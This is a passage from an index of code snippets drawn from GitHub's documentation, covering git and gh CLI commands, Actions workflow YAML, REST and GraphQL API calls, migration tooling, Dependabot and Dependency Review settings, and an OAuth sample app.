test_bank_account_integration.py file.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\npython -m unittest test_bank_account_integration.py\n```\n\n----------------------------------------\n\nTITLE: Unlocking Organization Repository via REST API\nDESCRIPTION: This command sends a `DELETE` request to the GitHub REST API endpoint to unlock an organization repository after migration. It requires a GitHub access token for authentication, the organization name, the migration ID, and the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" -X DELETE \\\n  -H \"Accept: application/vnd.github.wyandotte-preview+json\" \\\n  https://api.github.com/orgs/ORG-NAME/migrations/ID/repos/REPO_NAME/lock\n```\n\n----------------------------------------\n\nTITLE: Getting the IP Address of the VM in PowerShell\nDESCRIPTION: This PowerShell command retrieves the IP address of the virtual machine's network adapter.  Replace VM_NAME with the name of the VM. The IP address is then used to access the GitHub Enterprise Server configuration page in a web browser.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-hyper-v.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nPS C:\\> (Get-VMNetworkAdapter -VMName VM_NAME).IpAddresses\n```\n\n----------------------------------------\n\nTITLE: Defining a CodeQL Query Pack in YAML\nDESCRIPTION: This YAML snippet defines a CodeQL pack for custom C++ queries and libraries. It specifies the pack's name, version, and lists both `codeql/cpp-all` and a custom library pack (`my-github-user/my-custom-libraries`) as dependencies. The version ranges indicate compatibility with specific versions of each dependent pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\nname: my-github-user/my-custom-queries\nversion: 1.2.3\ndependencies:\n  codeql/cpp-all: ^0.1.2\n  my-github-user/my-custom-libraries: ^1.2.3\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Headers with Octokit.js\nDESCRIPTION: This code snippet shows how to add custom headers to a request using Octokit.js. It demonstrates setting the `content-type` and `X-GitHub-Api-Version` headers.  The `headers` property within the options object allows you to specify custom headers.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nawait octokit.request(\"GET /octocat\", {\n  headers: {\n    \"content-type\": \"text/plain\",\n    \"X-GitHub-Api-Version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Docker Container Action with Pre/Entrypoint/Post Scripts (YAML)\nDESCRIPTION: This snippet demonstrates how to use `pre-entrypoint`, `entrypoint`, and `post-entrypoint` scripts in a Docker container action. It defines scripts to run before the entrypoint, as the entrypoint, and after the entrypoint, respectively. Arguments are also passed to the entrypoint.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: 'docker'\n  image: 'Dockerfile'\n  args:\n    - 'bzz'\n  pre-entrypoint: 'setup.sh'\n  entrypoint: 'main.sh'\n  post-entrypoint: 'cleanup.sh'\n```\n\n----------------------------------------\n\nTITLE: Block Specific Licenses\nDESCRIPTION: This YAML snippet extends the dependency review action configuration to block dependencies with LGPL-2.0 or BSD-2-Clause licenses. It adds the `deny-licenses` option to specify the restricted licenses.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/customizing-your-dependency-review-action-configuration.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- name: 'Dependency Review'\n  uses: actions/dependency-review-action@v4\n  with:\n    fail-on-severity: moderate\n    deny-licenses: LGPL-2.0, BSD-2-Clause\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_NAME` to the GitHub Actions equivalent `${{ github.event.repository.name }}`. Accesses the repository name from the event context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_38\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.repository.name }}\n```\n\n----------------------------------------\n\nTITLE: Google Cloud Storage Issuer URL Example\nDESCRIPTION: This snippet shows an example of the issuer URL required when configuring Google Cloud Storage with OIDC. The `HOSTNAME` placeholder should be replaced with the public hostname for the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/enabling-github-actions-for-github-enterprise-server/enabling-github-actions-with-google-cloud-storage.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttps://HOSTNAME/_services/token\n```\n\nLANGUAGE: text\nCODE:\n```\nhttps://my-ghes-host.example.com/_services/token\n```\n\n----------------------------------------\n\nTITLE: Checking Runner Pods Status with Kubectl\nDESCRIPTION: This code snippet retrieves pods in the `arc-runners` namespace to monitor the creation and status of runner pods when a workflow is executed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nkubectl get pods -n arc-runners\n```\n\n----------------------------------------\n\nTITLE: Migrating a repository with GitHub Enterprise Importer\nDESCRIPTION: This bash script demonstrates how to migrate a single source repository from GitHub.com to a target repository within a GitHub Enterprise Cloud instance with data residency, using the `gh gei migrate-repo` command. It defines environment variables for tokens, API URLs, and organization/repository names. The script requires the GitHub CLI extension `gh gei` to be installed. Replace the placeholders in the script with your actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/data-residency/getting-started-with-data-residency-for-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/sh\n\nexport GH_PAT=\"TARGET-TOKEN\"\nexport GH_SOURCE_PAT=\"SOURCE-TOKEN\"\nexport TARGET_API_URL=\"TARGET-GHE-API-URL\"\nexport GITHUB_SOURCE_ORG=\"SOURCE-GH-ORGANIZATION-NAME\"\nexport SOURCE_REPO=\"SOURCE-GH-REPOSITORY-NAME\"\nexport GITHUB_TARGET_ORG=\"TARGET-GHE-ORGANIZATION-NAME\"\nexport TARGET_REPO=\"TARGET-GHE-REPOSITORY-NAME\"\n\ngh gei migrate-repo --target-api-url $TARGET_API_URL --github-source-org $GITHUB_SOURCE_ORG --source-repo $SOURCE_REPO --github-target-org $GITHUB_TARGET_ORG --target-repo $TARGET_REPO --verbose\n```\n\n----------------------------------------\n\nTITLE: Initializing an npm Package\nDESCRIPTION: This command initializes a new npm package in the current directory. It prompts the user for information such as the package name and version. The test script is set to `exit 0`, which always passes. Replace `YOUR-USERNAME` and `YOUR-REPOSITORY` with the correct values for your project. This generates a `package.json` file.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/quickstart.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ npm init\n  ...\n  package name: @YOUR-USERNAME/YOUR-REPOSITORY\n  ...\n  test command: exit 0\n  ...\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on issue or pull request comment events\nDESCRIPTION: This code snippet shows how to trigger a GitHub Actions workflow when a comment is created or deleted on an issue or pull request. The `on` keyword specifies the `issue_comment` event, and the `types` keyword filters for specific activity types: `created` and `deleted`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  issue_comment:\n    types: [created, deleted]\n```\n\n----------------------------------------\n\nTITLE: GraphQL Query for Repository IDs\nDESCRIPTION: This GraphQL query retrieves the IDs of the last 10 repositories in an organization. It demonstrates how to fetch a collection of items and their corresponding new global node IDs. The query targets the `repositories` connection within an `organization` and extracts the `id` field for each repository node.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-graphql-global-node-ids.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\n{\n  organization(login: \"github\") {\n    repositories(last: 10) {\n      edges {\n        cursor\n        node {\n          name\n          id\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a new extension project\nDESCRIPTION: Creates a basic extension project using the `gh extension create` command. Replace `EXTENSION-NAME` with the desired name for the new extension. This is the entry point for creating various types of extensions.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension create EXTENSION-NAME\n```\n\n----------------------------------------\n\nTITLE: Installing {% data variables.product.prodname_copilot_cli %} extension\nDESCRIPTION: This snippet demonstrates how to install the {% data variables.product.prodname_copilot_cli %} extension for the {% data variables.product.prodname_cli %}. It uses the `gh extension install` command to add the `github/gh-copilot` extension, providing enhanced command-line assistance.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install github/gh-copilot\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PIPELINE_IID to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PIPELINE_IID` to the GitHub Actions equivalent `${{ github.workflow }}`. The `${{ github.workflow }}` provides workflow identifier.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_32\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.workflow }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Service Container Job - YAML\nDESCRIPTION: This workflow configures a job to run inside a container, using a Redis service container. It defines the container image, health checks, and steps to connect to the Redis service. The job installs dependencies and then executes a Node.js script (client.js) to interact with Redis, using environment variables to configure the Redis host and port.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:20-bookworm-slim\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieves data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create a new Redis client.\n        env:\n          # The hostname used to communicate with the Redis service container\n          REDIS_HOST: redis\n          # The default Redis port\n          REDIS_PORT: 6379\n```\n\n----------------------------------------\n\nTITLE: Configure Copilot Chat as a Tutor\nDESCRIPTION: This snippet provides instructions for GitHub Copilot Chat to act as a tutor for a beginner coder. It emphasizes teaching coding concepts and best practices without providing direct solutions or code snippets. The instructions also encourage Copilot to share links to relevant external documentation and sources of truth, and to include a disclaimer about the correctness of AI-generated responses.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/setting-up-copilot-for-learning-to-code.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nI am learning to code. You are to act as a tutor; assume I am a beginning coder. Teach me coding concepts and best practices, but do not provide solutions. Explain code conceptually and help me understand what is happening in the code without giving answers.\n\nDo not provide code snippets, even if I ask you for implementation advice in my prompts. Teach me all the basic coding concepts in your answers. And help me understand the overarching approach that you are suggesting.\n\nWhenever possible, share links to relevant external documentation and sources of truth. \n\nAt the end of every response, add \"Always check the correctness of AI-generated responses.\"\n```\n\n----------------------------------------\n\nTITLE: Example: Setting and Getting Output Parameter in Bash\nDESCRIPTION: This YAML configuration demonstrates how to set the `SELECTED_COLOR` output parameter and retrieve it in a subsequent step. The color is set by appending to `$GITHUB_OUTPUT`, and accessed via `${{ steps.color-selector.outputs.SELECTED_COLOR }}`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_40\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Set color\n        id: color-selector\n        run: echo \"SELECTED_COLOR=green\" >> \"$GITHUB_OUTPUT\"\n      - name: Get color\n        env:{% raw %}\n          SELECTED_COLOR: ${{ steps.color-selector.outputs.SELECTED_COLOR }}{% endraw %}\n        run: echo \"The selected color is $SELECTED_COLOR\"\n\n```\n\n----------------------------------------\n\nTITLE: Updating Project Settings using GraphQL with gh\nDESCRIPTION: This snippet shows updating a project's settings using the `gh` CLI and GraphQL. Like the `curl` example, it requires replacing `PROJECT_ID` and allows setting `title`, `public`, `readme`, and `shortDescription`. The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_20\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    updateProjectV2(\\n      input: {\\n        projectId: \"PROJECT_ID\",\\n        title: \"Project title\",\\n        public: false,\\n        readme: \"# Project README\\n\\nA long description\",\\n        shortDescription: \"A short description\"\\n      }\\n    ) {\\n      projectV2 {\\n        id\\n        title\\n        readme\\n        shortDescription\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Job Steps - YAML\nDESCRIPTION: This YAML snippet details the steps executed in a GitHub Actions workflow job that runs directly on the runner and interacts with a Redis service. It includes checking out the repository, installing dependencies, and connecting to Redis using a Node.js script. The Redis host is set to 'localhost' because the Redis port is mapped to the host.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create\n    # a new Redis client.\n    env:\n          # The hostname used to communicate with the Redis service container\n      REDIS_HOST: localhost\n          # The default Redis port\n      REDIS_PORT: 6379\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_NAMESPACE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_NAMESPACE` to the GitHub Actions equivalent `${{ github.repository_owner }}`. Owner of repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_39\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository_owner }}\n```\n\n----------------------------------------\n\nTITLE: Display CodeQL pack locations - Shell\nDESCRIPTION: This command displays a list of available CodeQL packs and their locations. It uses the `codeql resolve packs` command in the shell.  It allows the user to understand where codeql packs are found in the system.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-packs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql resolve packs <options>...\n```\n\n----------------------------------------\n\nTITLE: Initialize Octokit\nDESCRIPTION: This code snippet initializes an Octokit instance for interacting with the GitHub API. It sets the authentication token and, optionally, the base URL for GitHub Enterprise Server instances. The 'YOUR-TOKEN' placeholder should be replaced with a valid GitHub personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\nimport { Octokit } from \"octokit\";\n\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: 'YOUR-TOKEN',\n});\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_MILESTONE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_MILESTONE` to the GitHub Actions equivalent `${{ github.event.pull_request.milestone }}`.  Provides access to the milestone associated with a pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_60\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.milestone }}\n```\n\n----------------------------------------\n\nTITLE: Updating and Pushing the Mirror\nDESCRIPTION: Fetches updates from the original repository and pushes them to the mirror, ensuring that the mirror stays synchronized with the original. The `-p` option prunes stale remote-tracking branches.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/duplicating-a-repository.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngit fetch -p origin\ngit push --mirror\n```\n\n----------------------------------------\n\nTITLE: Creating a Group via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP POST request used to provision a new group for an enterprise in GitHub using the SCIM API. The response includes an `id` field for uniquely identifying the group. The request requires an available license for users added to an organization as a result of provisioning the group.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_2\n\nLANGUAGE: HTTP\nCODE:\n```\nPOST /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups\n```\n\n----------------------------------------\n\nTITLE: Bulk Reclaiming Mannequins with ado2gh extension (GitHub CLI)\nDESCRIPTION: This command reclaims mannequins in bulk using a CSV file when the migration source is Azure DevOps. Replace DESTINATION with the target GitHub organization and FILENAME.csv with the CSV file containing mannequin mappings.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/completing-your-migration-with-github-enterprise-importer/reclaiming-mannequins-for-github-enterprise-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh reclaim-mannequin --github-org DESTINATION --csv FILENAME.csv\n```\n\n----------------------------------------\n\nTITLE: Disabling Actions Rate Limiting via ghe-config\nDESCRIPTION: This snippet demonstrates how to disable the rate limit for GitHub Actions using the `ghe-config` utility. It sets the `actions-rate-limiting.enabled` property to `false`, effectively disabling the rate limit.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-rate-limits.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config actions-rate-limiting.enabled false\n```\n\n----------------------------------------\n\nTITLE: Configuring Docker Registry\nDESCRIPTION: This snippet configures access to a private Docker registry using a username and password. It also sets `replaces-base` to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  dockerhub:\n    type: docker-registry\n    url: https://registry.hub.docker.com\n    username: octocat\n    password: ${{secrets.MY_DOCKERHUB_PASSWORD}}\n    replaces-base: true\n```\n\n----------------------------------------\n\nTITLE: Resource Labels for Runner Pod - YAML\nDESCRIPTION: The following YAML snippet shows the labels applied to runner pods in Actions Runner Controller. These labels indicate whether the runner is ephemeral, provide GitHub organization information, and identify the associated scale set.  They can be used for filtering or identifying specific runner instances.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nactions-ephemeral-runner= # True | False\nactions.github.com/organization= # Will be populated if githubConfigUrl is an organization URL\nactions.github.com/scale-set-name= # Runners scale set name\nactions.github.com/scale-set-namespace= # Runners namespace\napp.kubernetes.io/component=runner\napp.kubernetes.io/part-of=gha-runner-scale-set\napp.kubernetes.io/version= # Chart version\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables with Shell (PowerShell)\nDESCRIPTION: These PowerShell commands set the environment variables `$env:GH_PAT` and `$env:GH_SOURCE_PAT` to store personal access tokens (PATs) for accessing the destination enterprise and source organization, respectively. These variables are required for authenticating the GitHub CLI during the migration process. The commands are specifically for use in a PowerShell environment.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$env:GH_PAT=\"TOKEN\"\n$env:GH_SOURCE_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Testing GitHub Copilot Connection with curl\nDESCRIPTION: This command uses `curl` to check if the user can access GitHub Copilot's endpoint. The `--verbose` flag provides detailed information about the connection attempt, which can be helpful for diagnosing network issues.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/troubleshooting-github-copilot/troubleshooting-network-errors-for-github-copilot.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --verbose https://copilot-proxy.githubusercontent.com/_ping\n```\n\n----------------------------------------\n\nTITLE: Pushing Local Changes to GitHub (Windows, Linux)\nDESCRIPTION: Pushes the local changes from the local Git repository to the remote repository on GitHub for Windows and Linux. If your default branch is not named `main`, replace `main` with the name of your default branch. This version does not include the `-u` flag to set the upstream branch.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngit push origin main\n```\n\n----------------------------------------\n\nTITLE: Installing a Ruby Gem from the command line (Shell)\nDESCRIPTION: This code snippet shows how to install a Ruby gem from the command line using the `gem install` command. It includes specifying a specific version using the `--version` flag.  Replace `GEM_NAME` with the desired gem name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-rubygems-registry.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\ngem install GEM_NAME --version \"0.1.1\"\n```\n\n----------------------------------------\n\nTITLE: Finding Organization Project Node ID (curl)\nDESCRIPTION: This snippet demonstrates how to find the node ID of an organization project using a curl command with a GraphQL query. Replace `ORGANIZATION` with the organization name and `NUMBER` with the project number. It requires a `TOKEN` with `read:project` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"query{organization(login: \\\"ORGANIZATION\\\") {projectV2(number: NUMBER){id}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Changing Directory in Shell\nDESCRIPTION: This shell command changes the current working directory to the specified PARENT-FOLDER.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncd PARENT-FOLDER\n```\n\n----------------------------------------\n\nTITLE: Pushing a Single Tag to a Remote Repository with Git\nDESCRIPTION: This command pushes a specific tag to a remote repository. It mirrors the syntax for pushing a branch and requires the remote name and the tag name. The tag is then created on the remote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME TAG-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependency Review Action with Inline Options\nDESCRIPTION: This YAML snippet demonstrates how to configure the Dependency Review action with various inline options within a GitHub Actions workflow. It includes settings for `fail-on-severity`, `allow-licenses`, `deny-licenses`, `allow-ghsas`, and `fail-on-scopes`. It shows how to customize the action's behavior based on vulnerability severity, allowed/denied licenses, allowed GHSA IDs, and affected scopes.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/configuring-the-dependency-review-action.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: 'Dependency Review'\non: [pull_request]\n\npermissions:\n  contents: read\n\njobs:\n  dependency-review:\n    runs-on: {% ifversion ghes %}[self-hosted]{% else %}ubuntu-latest{% endif %}\n    steps:\n    - name: 'Checkout Repository'\n      uses: {% data reusables.actions.action-checkout %}\n    - name: Dependency Review\n      uses: actions/dependency-review-action@v4\n      with:\n        # Possible values: \"critical\", \"high\", \"moderate\", \"low\"\n        fail-on-severity: critical\n\n        {% ifversion dependency-review-action-licenses %}\n        # You can only include one of these two options: `allow-licenses` and `deny-licenses`\n        # ([String]). Only allow these licenses (optional)\n        # Possible values: Any SPDX-compliant license identifiers or expressions from https://spdx.org/licenses/\n        allow-licenses: GPL-3.0, BSD-3-Clause, MIT\n        # ([String]). Block the pull request on these licenses (optional)\n        # Possible values: Any SPDX-compliant license identifiers or expressions from https://spdx.org/licenses/\n        deny-licenses: LGPL-2.0, BSD-2-Clause\n        {% endif %}\n        # ([String]). Skip these {% data variables.product.prodname_advisory_database %} IDs during detection (optional)\n        # Possible values: Any valid {% data variables.product.prodname_advisory_database %} ID from https://github.com/advisories\n        allow-ghsas: GHSA-abcd-1234-5679, GHSA-efgh-1234-5679\n        # ([String]). Block pull requests that introduce vulnerabilities in the scopes that match this list (optional)\n        # Possible values: \"development\", \"runtime\", \"unknown\"\n        fail-on-scopes: development, runtime\n```\n\n----------------------------------------\n\nTITLE: Sinatra Server with GitHub OAuth and Session Management (Ruby)\nDESCRIPTION: This Ruby code defines a Sinatra application that implements GitHub OAuth with session management for persistent authentication. It handles authentication, retrieves user data, checks scopes, and renders an ERB template with the user's information. It uses the `sinatra`, `rest-client`, and `json` gems.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'sinatra'\nrequire 'rest_client'\nrequire 'json'\n\n# Don't use hard-coded values in your app\n# Instead, set and test environment variables, like below\n# if ENV['GITHUB_CLIENT_ID'] && ENV['GITHUB_CLIENT_SECRET']\n#  CLIENT_ID        = ENV['GITHUB_CLIENT_ID']\n#  CLIENT_SECRET    = ENV['GITHUB_CLIENT_SECRET']\n# end\n\nCLIENT_ID = ENV['GH_BASIC_CLIENT_ID']\nCLIENT_SECRET = ENV['GH_BASIC_SECRET_ID']\n\nuse Rack::Session::Pool, :cookie_only => false\n\ndef authenticated?\n  session[:access_token]\nend\n\ndef authenticate!\n  erb :index, :locals => {:client_id => CLIENT_ID}\nend\n\nget '/' do\n  if !authenticated?\n    authenticate!\n  else\n    access_token = session[:access_token]\n    scopes = []\n\n    begin\n      auth_result = RestClient.get('{% data variables.product.rest_url %}/user',\n                                   {:params => {:access_token => access_token},\n                                    :accept => :json})\n    rescue => e\n      # request didn't succeed because the token was revoked so we\n      # invalidate the token stored in the session and render the\n      # index page so that the user can start the OAuth flow again\n\n      session[:access_token] = nil\n      return authenticate!\n    end\n\n    # the request succeeded, so we check the list of current scopes\n    if auth_result.headers.include? :x_oauth_scopes\n      scopes = auth_result.headers[:x_oauth_scopes].split(', ')\n    end\n\n    auth_result = JSON.parse(auth_result)\n\n    if scopes.include? 'user:email'\n      auth_result['private_emails'] =\n        JSON.parse(RestClient.get('{% data variables.product.rest_url %}/user/emails',\n                       {:params => {:access_token => access_token},\n                        :accept => :json}))\n    end\n\n    erb :advanced, :locals => auth_result\n  end\nend\n\nget '/callback' do\n  session_code = request.env['rack.request.query_hash']['code']\n\n  result = RestClient.post('https://github.com/login/oauth/access_token',\n                          {:client_id => CLIENT_ID,\n                           :client_secret => CLIENT_SECRET,\n                           :code => session_code},\n                           :accept => :json)\n\n  session[:access_token] = JSON.parse(result)['access_token']\n\n  redirect '/'\nend\n```\n\n----------------------------------------\n\nTITLE: Linking to Images in a Repository using Markdown\nDESCRIPTION: This snippet demonstrates how to link to an image stored in a GitHub repository within a wiki page using Markdown. The image URL is constructed by referencing the repository, branch (main), and path to the image file.  The `alt` attribute provides alternative text for accessibility and SEO.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/documenting-your-project-with-wikis/editing-wiki-content.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\n[[https://github.com/USERNAME/REPOSITORY/blob/main/img/octocat.png|alt=octocat]]\n```\n\n----------------------------------------\n\nTITLE: Requesting specific page using curl\nDESCRIPTION: This curl command demonstrates how to request a specific page of results from the GitHub API using the `page` query parameter. The `--include` flag is used to include the response headers. The Accept header specifies the desired media type.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-pagination-in-the-rest-api.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --include --request GET \\\n--url \"https://api.github.com/repositories/1300192/issues?page=515\" \\\n--header \"Accept: 